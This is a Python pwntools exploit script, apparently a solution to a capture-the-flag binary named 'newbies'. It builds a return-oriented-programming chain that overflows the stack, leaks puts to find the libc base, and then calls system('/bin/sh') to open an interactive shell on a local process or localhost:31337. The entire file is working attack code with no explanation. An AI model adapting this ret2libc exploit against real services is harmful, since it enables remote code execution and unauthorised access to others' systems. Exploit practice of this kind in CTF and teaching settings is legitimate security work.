# Coding: utf-8
from pwn import *

local = True
libc = ELF("./newbies-libc-2.23.so", checksec=False)
elf = ELF("./newbies", checksec=False)
env = {"LD_PRELOAD" : libc.path}

while True:
	io = process(elf.path, env=env) if local else remote("localhost", 31337)
	print io.recvline()
	io.sendline(
		p64(0x4004f1)*(0xb8//8) + # ret;
		p64(0x4005c0) + # pop rbp; ret;
		p64(0x601400) + 
		p64(0x400763) + # pop rdi; ret;
		p64(0x601018) + 
		p64(0x400510) + # puts@plt
		p64(0x400761) + # pop rsi; pop r15; ret; 
		p64(0x601400) + "A"*8 + 
		p64(0x40068c) # vuln+54
	)

	try:
		libc.address = u64(io.recv(6).ljust(8, '\0')) - libc.symbols['puts']
	except:
		io.close()
		continue

	print "[+] libc_base: 0x%x" % libc.address
	system = libc.symbols['system']
	bin_sh = next(libc.search("/bin/sh\0"))

	try:
		io.sendline("A"*8 + p64(0x400763) + p64(bin_sh) + p64(system))
	except:
		io.close()
		continue
	break


print "[+] system: 0x%x" % system
print "[+] bin_sh: 0x%x" % bin_sh
io.interactive()
